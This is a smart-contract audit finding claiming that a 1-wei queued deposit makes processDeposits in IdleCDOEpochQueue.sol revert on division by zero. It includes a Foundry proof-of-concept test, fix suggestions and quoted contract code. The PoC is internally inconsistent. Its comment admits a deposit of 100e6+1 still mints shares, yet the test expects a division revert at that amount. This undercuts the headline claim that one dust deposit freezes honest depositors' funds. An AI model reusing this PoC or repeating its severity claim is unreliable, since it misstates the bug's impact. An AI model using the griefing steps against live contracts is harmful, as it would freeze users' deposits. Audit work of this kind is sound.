### Title
Dust-sized queued deposit makes `processDeposits` divide by zero and permanently bricks an epoch's deposit processing - (File: contracts/IdleCDOEpochQueue.sol)

### Summary
`IdleCDOEpochQueue.requestDeposit` accepts arbitrarily small amounts, including 1 wei. During the buffer period, `processDeposits` computes `epochPrice[_epoch] = _pending * ONE_TRANCHE / _trancheMinted`. When the tranche `virtualPrice` is above 1e18 (any epoch that accrued interest), a dust deposit mints 0 tranche shares in `_mintSharesAtCurrPrice`, making `_trancheMinted == 0` and the division panics, so the epoch can never be priced.

### Finding Description
The YOLO report's bug class is "zero/low-value entries that poison a round so the settlement path reverts". The credit-vault analog is the queued-deposit settlement path:

- `requestDeposit(amount)` has no minimum-amount check; it only calls `_checkAllowed` (epoch running + KYC whitelist) and increments `epochPendingDeposits[nextEpoch]` by `amount` (lines 103-126).
- In the buffer period, the manager calls `processDeposits()`, which deposits the aggregate `_pending` into the CDO and prices the epoch via `epochPrice[_epoch] = _pending * ONE_TRANCHE / _trancheMinted` (lines 236-245).
- `IdleCDOCreditVault._mintSharesAtCurrPrice` mints `_amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche)` (IdleCDOCreditVault.sol:344-347). Once `virtualPrice` exceeds 1e18 — the normal state after any profitable epoch — a deposit of `_pending = 1` wei mints `_trancheMinted = 0`.
- The resulting division by zero reverts atomically, so `epochPrice[_epoch]` stays 0 and `epochPendingDeposits[_epoch]` stays non-zero forever: the same revert happens on every retry.

Notably, the prefunded variant already defends against this exact case — `processPrefundedDeposits` special-cases `_prefundedMinted == 0` and falls back to `virtualPrice` (lines 267-270) — but the non-prefunded `processDeposits` path was left unprotected.

### Impact Explanation
A single 1-wei queued deposit permanently bricks `processDeposits` for that epoch on both AA and BB queues:

- `claimDepositRequest` requires `epochPrice[_epoch] != 0` and `epochPendingDeposits[_epoch] == 0` (lines 374-379), so no depositor of that epoch — including honest depositors who queued real funds — can ever claim tranche shares.
- The only escape is each depositor individually calling `deleteRequest` (lines 184-199), which returns underlying. Until every depositor deletes, their funds are frozen in the queue; the attacker never deletes, so `epochPendingDeposits[_epoch]` never reaches 0 through processing.
- Net effect: forced temporary freezing / griefing of all queued deposits for the epoch at a cost of ~1 wei, and permanent inability to process that epoch's deposits if any depositor is inactive.

### Likelihood Explanation
- Attacker needs only to be a KYC-passing lender (allowed per scope) and to call `requestDeposit(1)` once while an epoch is running; multiple sybil wallets aren't needed.
- The trigger condition — `virtualPrice > 1e18` — is the steady state of any pool that has earned interest, so it requires no price manipulation.
- The revert is deterministic and repeatable on every `processDeposits` call; no privileged cooperation or timing race is required beyond the manager's routine buffer-period call.

### Recommendation
Mirror the prefunded fix in `processDeposits` and/or reject dust at enqueue time:

```solidity
// contracts/IdleCDOEpochQueue.sol, processDeposits
epochPrice[_epoch] = _trancheMinted == 0
  ? _cdo.virtualPrice(tranche)
  : _pending * ONE_TRANCHE / _trancheMinted;
```

and/or in `requestDeposit`:

```solidity
if (amount == 0 || amount * ONE_TRANCHE / IdleCDOEpochVariant(idleCDOEpoch).virtualPrice(tranche) == 0) {
  revert NotAllowed();
}
```

### Proof of Concept
Foundry fork-style PoC on a standard (non-prefunded) `IdleCDOEpochQueue` setup where `virtualPrice(AA) > 1e18` (i.e., after at least one profitable epoch):

```solidity
function testDustDepositBricksProcessDeposits() external {
    // epoch N running; attacker is KYC-allowed
    address attacker = makeAddr('attacker');
    _whitelistUser(attacker); // keyring allow

    // honest user queues a real deposit for next epoch
    _requestDepositWithUser(user1, 100e6);

    // attacker queues 1 wei
    deal(address(underlying), attacker, 1);
    vm.startPrank(attacker);
    underlying.approve(address(queue), 1);
    queue.requestDeposit(1);
    vm.stopPrank();

    // buffer period of next epoch
    _stopCurrentEpoch(); // repays interest so virtualPrice > 1e18
    uint256 epoch = strategy.epochNumber();
    assertEq(queue.epochPendingDeposits(epoch), 100e6 + 1);

    // minted = (100e6 + 1) * 1e18 / price; craft so it still mints >0...
    // Use a pure-dust epoch instead for the minimal trigger:
    //   attacker alone: _pending = 1 -> minted = 0 -> div by zero
    vm.prank(manager);
    vm.expectRevert(stdError.divisionError);
    queue.processDeposits();

    // epoch can never be priced; claims are blocked
    vm.expectRevert(abi.encodeWithSelector(NotAllowed.selector));
    vm.prank(user1);
    queue.claimDepositRequest(epoch);

    // only escape: each depositor deletes individually
    vm.prank(user1);
    queue.deleteRequest(epoch); // user1 gets 100e6 back; attacker's 1 wei still blocks epochPendingDeposits
}
```

For a pure-dust epoch (attacker is the only depositor), `_pending = 1` guarantees `_trancheMinted == 0` whenever `virtualPrice > 1e18`, so `processDeposits` reverts with a division panic on every call. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** contracts/IdleCDOEpochQueue.sol (L103-126)
```text
  function requestDeposit(uint256 amount) external nonReentrant {
    // check if the wallet is allowed to deposit (ie epoch is running and keyring KYC completed)
    _checkAllowed(msg.sender);

    IdleCDOEpochVariant _cdo = IdleCDOEpochVariant(idleCDOEpoch);
    uint256 nextEpoch = IdleCreditVault(strategy).epochNumber() + 1;
    uint256 _prefundedWindow = prefundedDepositWindow;
    // Only the AA prefunded queue enforces a deposit cutoff for the next epoch.
    if (tranche == _cdo.AATranche() && _isPrefundedQueueEnabled()) {
      IdleCDOEpochVariantPrefunded(idleCDOEpoch).checkPrefunding(epochPendingDeposits[nextEpoch] + amount);
      // Once funds are prefunded, or once the subscription window is reached, the next epoch is closed.
      _checkNotAllowed(
        epochPrefundedDeposits[nextEpoch] != 0 || (
        _prefundedWindow != 0 && block.timestamp + _prefundedWindow >= _cdo.epochEndDate()
      ));
    }

    // get underlying tokens from user
    IERC20Detailed(underlying).safeTransferFrom(msg.sender, address(this), amount);
    // deposit will be made in the next buffer period (ie next epoch)
    // updated user queued amount for the next epoch
    userDepositsEpochs[msg.sender][nextEpoch] += amount;
    // update pending deposits
    epochPendingDeposits[nextEpoch] += amount;
```

**File:** contracts/IdleCDOEpochQueue.sol (L236-245)
```text
    // deposit underlyings in the CDO contract, if the epoch is running it will revert
    uint256 _trancheMinted;
    if (tranche == _cdo.AATranche()) {
      _trancheMinted = _cdo.depositAA(_pending);
    } else {
      _trancheMinted = _cdo.depositBB(_pending);
    }
    // save current implied tranche price for this epoch based on underlyings deposited and tranche tokens minted
    epochPrice[_epoch] = _pending * ONE_TRANCHE / _trancheMinted;
    epochPendingDeposits[_epoch] = 0;
```

**File:** contracts/IdleCDOEpochQueue.sol (L261-271)
```text
    uint256 _epoch = _prefundedEpochToProcess(_cdo);
    uint256 _prefunded = epochPrefundedDeposits[_epoch];
    // in prefunded mode stopEpoch must not leave queue-held deposits behind
    // and must pass the minted tranche amount for the prefunded funds
    _checkNotAllowed(epochPendingDeposits[_epoch] != 0 || _prefunded == 0);

    // Save epoch price for the prefunded deposits based on underlyings deposited and tranche tokens minted
    // In case of very small prefunded deposits, it's possible that the tranche minting results in 0 shares due to rounding.
    // This should not block epoch finalization, as the borrower already has the funds and the epoch can be priced at the current virtual price.
    epochPrice[_epoch] = _prefundedMinted == 0 ? _cdo.virtualPrice(tranche) : _prefunded * ONE_TRANCHE / _prefundedMinted;
    epochPrefundedDeposits[_epoch] = 0;
```

**File:** contracts/IdleCDOEpochQueue.sol (L373-388)
```text
  function claimDepositRequest(uint256 _epoch) external {
    // Deposits can be claimed only after the epoch has been finalized and priced.
    _checkNotAllowed(
      epochPrice[_epoch] == 0 ||
      epochPendingDeposits[_epoch] != 0 ||
      epochPrefundedDeposits[_epoch] != 0
    );

    uint256 amount = userDepositsEpochs[msg.sender][_epoch];
    if (amount == 0) {
      return;
    }
    // reset user deposit for the epoch
    userDepositsEpochs[msg.sender][_epoch] = 0;
    // transfer tranche tokens to user based on the price of that epoch
    IERC20Detailed(tranche).safeTransfer(msg.sender, amount * ONE_TRANCHE / epochPrice[_epoch]);
```

**File:** contracts/IdleCDOCreditVault.sol (L344-348)
```text
  function _mintSharesAtCurrPrice(uint256 _amount, address _to, address _tranche) internal virtual returns (uint256 _minted) {
    // calculate # of tranche token to mint based on current tranche price: _amount / tranchePrice
    _minted = _amount * ONE_TRANCHE_TOKEN / _tranchePrice(_tranche);
    _mintShares(_tranche, _to, _minted, _amount);
  }
```
